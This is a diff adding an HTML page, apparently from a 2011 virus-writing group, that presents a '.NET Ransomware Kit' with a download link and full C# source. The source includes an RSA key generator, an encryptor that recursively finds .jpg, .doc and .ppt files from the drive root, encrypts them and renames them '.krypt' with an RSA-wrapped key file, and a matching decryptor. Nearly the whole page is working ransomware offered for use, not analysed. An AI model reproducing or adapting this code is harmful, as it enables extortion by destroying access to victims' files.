@@ -1,0 +1,273 @@
+<html>
+<body bgcolor=#000000>
+<pre><u><a href="javascript:history.back()" style=color:#FFD700>return To index</a></u> <b style=color:#FFD700>|</b> <a href="binaries/ransomware.RAR" style=color:#FFD700>download demo package!</a></pre>
+<hr />
+<pre style=color:#FFD700>
+
+.NET Ransomware Kit
+-------------------
+alcopaul/brigada ocho
+june 11, 2011
+
+==================================
+RSA Private key/Public key Creator
+==================================
+using System;
+using System.Windows.Forms;
+using System.Security.Cryptography;
+
+private void button1_Click(object sender, EventArgs e)
+        {
+            CspParameters cspParams = new CspParameters();
+            cspParams.ProviderType = 1;
+            cspParams.Flags = CspProviderFlags.UseArchivableKey;
+            cspParams.KeyNumber = (int)KeyNumber.Exchange;
+            RSACryptoServiceProvider rsaProvider = new RSACryptoServiceProvider(Convert.ToInt32(comboBox1.SelectedItem), cspParams);
+
+            textBox1.Text = rsaProvider.ToXmlString(true);
+            textBox2.Text = rsaProvider.ToXmlString(false);
+
+        }
+
+//textBox1.Text contains the generated private key
+//textBox2.Text contains the generated public key
+//comboBox1.Items = {"1024","2048","3072"};
+
+=========================================================================================================
+Encryptor = searches for certain filetypes in the hard disk, encrypts them using Rijndael with random key
+and encrypts the random key using a public key.. (jjj = public key)
+=========================================================================================================
+
+using System;
+using System.IO;
+using System.Security.Cryptography;
+using System.Text;
+using System.Collections;
+using System.Diagnostics;
+
+namespace ConsoleApplication9
+{
+    public class RandomUtil
+    {
+        public static string GetRandomString()
+        {
+            string path = Path.GetRandomFileName();
+            path = path.Replace(".", ""); // Remove period.
+            return path;
+        }
+        static byte[] EncryptKey(string publicKeyText, byte[] key)
+        {
+            CspParameters cspParams = new CspParameters();
+            cspParams.ProviderType = 1;
+            RSACryptoServiceProvider rsaProvider = new RSACryptoServiceProvider(cspParams);
+            // Import public key
+            rsaProvider.FromXmlString(publicKeyText);
+            byte[] encryptedBytes = rsaProvider.Encrypt(key, false);
+            // Write encrypted text to file
+            return encryptedBytes;
+
+        } // Encrypt
+        public void EncryptFile(string file)
+        {
+            ASCIIEncoding askii = new ASCIIEncoding();
+            Random j = new Random((int)DateTime.Now.Ticks);
+            int h = j.Next(0, 7);
+            string p = GetRandomString() + GetRandomString().Substring(h, 5);
+            byte[] key = askii.GetBytes(p);
+            string newfile = file + ".krypt";
+
+
+            MemoryStream fsm = new MemoryStream();
+            RijndaelManaged cr = new RijndaelManaged();
+            CryptoStream cs = new CryptoStream(fsm, cr.CreateEncryptor(key, key), CryptoStreamMode.Write);
+            FileStream fsIn = new FileStream(file, FileMode.Open);
+            int data;
+            while ((data = fsIn.ReadByte()) != -1)
+            {
+                cs.WriteByte((byte)data);
+            }
+            cs.FlushFinalBlock();
+            fsIn.Close();
+            FileStream outStream = File.OpenWrite(file);
+            fsm.WriteTo(outStream);
+            outStream.Flush();
+            outStream.Close();
+            fsm.Close();
+            cs.Close();
+            File.Move(file, newfile);
+
+            string jjj = "[PUBLIC KEY HERE]";
+            using (Stream fileStream = new FileStream(file + ".key", FileMode.Create, FileAccess.Write, FileShare.None))
+            {
+                using (BinaryWriter bw = new BinaryWriter(fileStream))
+                {
+                    bw.Write(EncryptKey(jjj, key));
+                }
+            }
+        }
+
+    }
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string xselfy = Process.GetCurrentProcess().MainModule.FileName;
+            string xyxx = Path.GetDirectoryName(xselfy);
+            string glen = Directory.GetDirectoryRoot(xyxx);
+            DirectoryInfo dirx = new DirectoryInfo(@glen);
+            // Test the random string method.
+            RandomUtil hfff = new RandomUtil();
+            AndLetsRock(dirx,hfff);
+        }
+        private static void AndLetsRock(DirectoryInfo dir, RandomUtil xg)
+        {
+            string lookfor = "*.jpg>*.doc>*.ppt";
+            string[] extensions = lookfor.Split(new char[] { '>' });
+
+            ArrayList myfileinfos = new ArrayList();
+
+            foreach (string ext in extensions)
+            {
+                myfileinfos.AddRange(dir.GetFiles(ext));
+            }
+
+            FileInfo[] xfinal = (FileInfo[])myfileinfos.ToArray(typeof(FileInfo));
+
+
+            foreach (FileInfo g in xfinal)
+            {
+                try
+                {
+                    //error encrypting file
+                    xg.EncryptFile(g.FullName);
+                }
+                catch
+                {
+                    continue;
+                }
+            }
+            DirectoryInfo[] dirs = dir.GetDirectories("*.*");
+            foreach (DirectoryInfo xdir in dirs)
+            {
+                try
+                {
+                    AndLetsRock(xdir,xg);
+                }
+                catch
+                {
+                    continue;
+                }
+            }
+        }
+    }
+}
+
+============================================================================================================
+Decryptor = decrypts "*.key" files using the private key. Decrypted values will be used to decrypt "*.krypt" 
+files in the hard disk which will give us the original files... (ggg = private key)
+============================================================================================================
+
+using System;
+using System.IO;
+using System.Security.Cryptography;
+using System.Text;
+using System.Collections;
+using System.Diagnostics;
+
+public class RandomUtil
+{
+    static byte[] DecryptKey(string privateKeyText, byte[] key)
+    {
+        // Select target CSP
+        CspParameters cspParams = new CspParameters();
+        cspParams.ProviderType = 1; // PROV_RSA_FULL 
+        //cspParams.ProviderName; // CSP name
+        RSACryptoServiceProvider rsaProvider = new RSACryptoServiceProvider(cspParams);
+
+        // Import public key
+        rsaProvider.FromXmlString(privateKeyText);
+
+
+        byte[] encryptedBytes = rsaProvider.Decrypt(key, false);
+
+        return encryptedBytes;
+
+    }
+
+
+    public void DecryptFile(string encfile, string keyfile)
+    {
+        byte[] keyx = File.ReadAllBytes(keyfile);
+        string ggg = "[PRIVATE KEY HERE]";
+        byte[] key = DecryptKey(ggg, keyx);
+        string newfile = encfile.Substring(0, (encfile.Length - 6));
+
+
+        FileStream fsc = new FileStream(newfile, FileMode.Create);
+        RijndaelManaged cr = new RijndaelManaged();
+        CryptoStream cs = new CryptoStream(fsc, cr.CreateDecryptor(key, key), CryptoStreamMode.Write);
+        FileStream fsIn = new FileStream(encfile, FileMode.Open);
+
+        int data;
+        while ((data = fsIn.ReadByte()) != -1)
+        {
+            cs.WriteByte((byte)data);
+        }
+        fsIn.Close();
+        cs.Close();
+        fsc.Close();
+
+
+        File.Delete(encfile);
+        File.Delete(keyfile);
+    }
+}
+
+
+
+class Program
+{
+    static void Main()
+    {
+        string xselfy = Process.GetCurrentProcess().MainModule.FileName;
+        string xyxx = Path.GetDirectoryName(xselfy);
+        string glen = Directory.GetDirectoryRoot(xyxx);
+        DirectoryInfo dirx = new DirectoryInfo(@glen);
+        RandomUtil hfff = new RandomUtil();
+        AndLetsRock(dirx, hfff);
+    }
+    private static void AndLetsRock(DirectoryInfo dir, RandomUtil xg)
+    {
+        FileInfo[] xfinal = dir.GetFiles("*.krypt");
+
+        foreach (FileInfo g in xfinal)
+        {
+            try
+            {
+                string j = g.FullName;
+                xg.DecryptFile(j, j.Substring(0, (j.Length - 5)) + "key");
+            }
+            catch
+            {
+                continue;
+            }
+        }
+        DirectoryInfo[] dirs = dir.GetDirectories("*.*");
+        foreach (DirectoryInfo xdir in dirs)
+        {
+            try
+            {
+                AndLetsRock(xdir, xg);
+            }
+            catch
+            {
+                continue;
+            }
+        }
+    }
+}
+
+
+</pre>
+</body>
+</html>
